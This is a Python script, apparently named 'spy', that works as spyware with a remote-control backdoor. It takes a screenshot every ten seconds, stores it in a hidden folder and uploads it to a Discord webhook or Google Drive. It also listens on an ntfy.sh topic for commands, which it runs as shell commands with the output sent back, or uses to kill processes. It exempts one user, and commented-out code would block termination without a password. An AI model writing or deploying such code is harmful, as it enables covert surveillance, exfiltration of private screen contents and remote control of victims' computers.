#!/usr/bin/env python

import time, os
from datetime import datetime,timedelta
from mss import mss
from discord_webhook import DiscordWebhook, DiscordEmbed
from dotenv import load_dotenv
import signal
import time
import sys
import signal
import hashlib
import sys
import json
import asyncio
import websockets
from plyer import notification
import psutil
import humanize
import subprocess
# required if you want to upload screenshots on google drive
from google.oauth2.service_account import Credentials
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
from googleapiclient.http import MediaFileUpload



load_dotenv('/usr/local/src/spy/.env')
NUCLEAR_CODE = os.getenv('NUCLEAR_CODE')

userhome = os.path.expanduser('~')
SS_URL = os.getenv('DISCORD_SS_URL')
LOG_URL = os.getenv('DISCORD_LOG_URL')

def send_msg_on_discord(msg, is_file=False):
    
    content = f'{userhome} - {datetime.now()}' if is_file else msg
    webhook = DiscordWebhook(url=SS_URL if is_file else LOG_URL, content=content, rate_limit_retry=True)
    if is_file:
        webhook.add_file(file=open(msg, 'rb').read(), filename=msg)
    response = webhook.execute()
        
def upload_file_on_google_drive(file_path):

    creds = Credentials.from_service_account_file(os.getenv('CREDENTIALS_FILE')) #################### Your Google Service Account Credentials
    service = build('drive', 'v3', credentials=creds)
    folder_id = os.getenv('FOLDER_ID')                                                       #################### Google Drive Folder

    file_name = os.path.basename(file_path)

    file_metadata = {
        'name': file_name,
        'parents' : [folder_id]
    }
    
    media = MediaFileUpload(file_path , resumable=True)
    file = service.files().create(
        body=file_metadata,
        media_body=media,
        fields='id',
        uploadType='resumable'
    ).execute()
    
    #print(f'File ID: {file.get("id")}')
    
    
    """ req_body = {
        'role' : 'reader',
        'type' : 'anyone'
    }
    
    service.permissions().create(
        fileId=file.get("id"),
        body=req_body
    ).execute() """        ######### if you want your file to be public >> by defult its public if your folder is public
    
    link = service.files().get(
        fileId=file.get("id"),
        fields='webViewLink'
    ).execute()
    
    print(link['webViewLink'])
    
    return {
        'id' : file.get("id"),
        'link' : link['webViewLink'],
        'name' : file_name
    }


# Function to handle the received signal
def handle_signal(signal_number, frame):
    print("\nSignal received.")
    try:
        # Hash the entered password using SHA-256
        password_hash = hashlib.sha256(open('/tmp/spy.pass', 'r').read().strip().encode()).hexdigest()
        
        # Compare the hashed password with the predefined hash
        if password_hash == NUCLEAR_CODE:
            print("Password correct. Terminating the program.")
            sys.exit(0)
        else:
            print("Incorrect password. Continuing the program...")
    except Exception as e:
        print(e)

def kill_process_by_name(name):
    # Iterate over all running processes
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            # If the process name matches, terminate it
            if proc.info['name'].lower() == name.lower():
                print(f"Killing process: {proc.info['name']} with PID: {proc.info['pid']}")
                proc.terminate()  # Terminate the process
                proc.wait()  # Wait for the process to terminate
                send_msg_on_discord(f"Process {proc.info['name']} (PID {proc.info['pid']}) terminated.")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess) as e:
            send_msg_on_discord(e)
            # Ignore processes that no longer exist or are inaccessible
            continue


# Function to handle receiving messages from the WebSocket
async def subscribe_to_topic():
    # Define the ntfy server and topic
    ntfy_server_url = "wss://ntfy.sh"  # WebSocket URL for ntfy
    topic = os.getenv('NTFY_TOPIC')

    # Define the WebSocket URL for the topic
    ws_url = f"{ntfy_server_url}/{topic}/ws"
    try:
        # Establish WebSocket connection
        async with websockets.connect(ws_url) as websocket:
            print(f"Connected to WebSocket for topic: {topic}")

            # Continuously listen for messages
            while True:
                try:
                    response = json.loads(await websocket.recv())  # Wait for a message
                    msg = response.get('message')
                    if not msg:
                        continue
                    print(f"New message: {msg}")
                    if msg.startswith('cmd'):
                        # Use subprocess.run to capture the output
                        command = msg.split(' ')[1:]
                        result = subprocess.run(command, capture_output=True, text=True, shell=False)
                        # Access the standard output (stdout) from the result
                        output = result.stdout[:1950]
                        print(output)
                        send_msg_on_discord(f'```{output}```')
                    elif msg == 'uptime':
                        t = 'uptime: ' + humanize.precisedelta(timedelta(seconds=time.time() - psutil.boot_time()))
                        send_msg_on_discord(t)
                    elif msg.startswith('kill'):              
                        for p in msg.split(' ')[1:]:
                            kill_process_by_name(p)
                    else:
                         # Display the message as a system notification
                        notification.notify(
                            title=f"Message Received",
                            message=msg,
                            #icon_path="your-icon-path.png",  # Optional, specify if you want an icon
                            timeout=10
                        )
                except Exception as e:
                    send_msg_on_discord(e)
                    print(e)

    except Exception as e:
        print(f"Error: {e}")


async def take_screenshot_periodically():
    if 'talha' in userhome:
        return
    while True:
        try:
            print(datetime.now(), 'Taking screenshot...')
            with mss() as sct:
                folder = f"{userhome}/.spy"
                filename= f"{datetime.now().strftime('%Y%m%d%H%M%S')}_{os.environ.get('USER')}.png"
                path = os.path.join(folder, filename)
                os.makedirs(folder, exist_ok=True)
                filename=sct.shot(output=path)
                try:
                    print('uploading to discord')
                    send_msg_on_discord(filename, is_file=True)
                    os.unlink(filename)
                except Exception as e:
                    print(e)
                    print('Uploading file on google drive...', filename)
                    upload_file_on_google_drive(filename);os.unlink(filename)                    
        except Exception as e:
            print(e)
        print('sleeping...')
        await asyncio.sleep(10)

# Main function to run both tasks concurrently
async def main():
    # Start both tasks concurrently
    await asyncio.gather(
        subscribe_to_topic(),
        take_screenshot_periodically(),  # Add your screenshot task here
    )

if __name__ == "__main__":
    
    # Register the handler for all signals (for demonstration purposes, capturing SIGINT and SIGTERM)
    #for sig in [signal.SIGINT, signal.SIGTERM, signal.SIGHUP, signal.SIGQUIT]:
    #    signal.signal(sig, handle_signal)
    
    asyncio.run(main())


    

